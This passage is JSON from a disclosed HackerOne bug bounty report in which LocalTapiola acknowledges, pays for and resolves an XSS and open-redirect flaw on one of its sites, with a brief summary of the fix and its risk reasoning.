feedback.","automated_response":false,"created_at":"2017-02-02T14:33:05.181Z","updated_at":"2017-02-02T14:33:05.181Z","actor":{"username":"sandh0t","cleared":true,"url":"/sandh0t","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/006/299/944129af89e7f714b860d3bf18fdb3500424b999_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1462096,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"since the issue is fixed now, would you update the status.","automated_response":false,"created_at":"2017-02-03T23:29:14.627Z","updated_at":"2017-02-03T23:29:14.627Z","actor":{"username":"sandh0t","cleared":true,"url":"/sandh0t","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/006/299/944129af89e7f714b860d3bf18fdb3500424b999_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1462556,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks for your report...","automated_response":false,"created_at":"2017-02-04T09:07:13.576Z","updated_at":"2017-02-04T09:08:39.329Z","actor":{"url":"/localtapiola","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/008/416/b6fbd7e94497b0ffaee584d2e7096c5d5e2082e2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"LocalTapiola"}},"bounty_amount":"450.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"localtapiola","collaborator":{"username":"sandh0t","url":"/sandh0t"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1462558,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"... resolving ...","automated_response":false,"created_at":"2017-02-04T09:07:59.103Z","updated_at":"2017-02-04T09:08:50.116Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"sandh0t","url":"/sandh0t"},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1462559,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"...and full disclosure.","automated_response":false,"created_at":"2017-02-04T09:08:26.712Z","updated_at":"2017-02-04T09:08:26.712Z","first_to_agree":true,"actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1462656,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks.","automated_response":false,"created_at":"2017-02-04T11:27:23.543Z","updated_at":"2017-02-04T11:27:23.543Z","actor":{"username":"sandh0t","cleared":true,"url":"/sandh0t","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/006/299/944129af89e7f714b860d3bf18fdb3500424b999_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1521259,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2017-03-06T09:08:43.367Z","updated_at":"2017-03-06T09:08:43.367Z","actor":{"url":"/localtapiola","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/008/416/b6fbd7e94497b0ffaee584d2e7096c5d5e2082e2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"LocalTapiola"}},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"id":3306,"category":"team","content":"##Issue\n\nThe reporter found a simple XSS in viestinta.lahitapiola.fi but later discovered that the vulnerability also allowed open and unvalidated redirects. \n\n##Fix\n\nAn updated version of the application was issued to address the problem.\n\n##Reasoning\n\nAn XSS as such is not a huge issue from a risk perspective, although it poses a small risk for stealing of credentials. Open redirects allow for far more sophisticated attack vectors using mass phishing emails and a customized malicious login page.","can_view?":true,"can_create?":false,"attachments":[],"user":{"id":60017,"username":"localtapiola-thomas","name":"localtapiola-thomas","bio":"LocalTapiola Bug Bounty Coordinator - @tsmalmbe","cleared":false,"website":"http://www.lahitapiola.fi","location":"Espoo, Finland","created_at":"2016-03-09T13:58:17.117Z","url":"https://hackerone.com/localtapiola-thomas","anc_triager":false,"hackerone_triager":false,"hackerone_employee":false,"user_type":"legacy","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c","xtralarge":"https://hackerone.com/rails/active_storage/representations/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBBcWtrIiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--ef0702cef87b20f1437c9a717c8b44719b380f58/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaDdCam9MY21WemFYcGxTU0lOTWpZd2VESTJNRDRHT2daRlZBPT0iLCJleHAiOm51bGwsInB1ciI6InZhcmlhdGlvbiJ9fQ==--7e37b612eb3c91a96f98ad01ca9fbe53cab870dd/hackerone-userlogo.png"}}},{"category":"researcher","can_view?":true,"can_create?":false}]}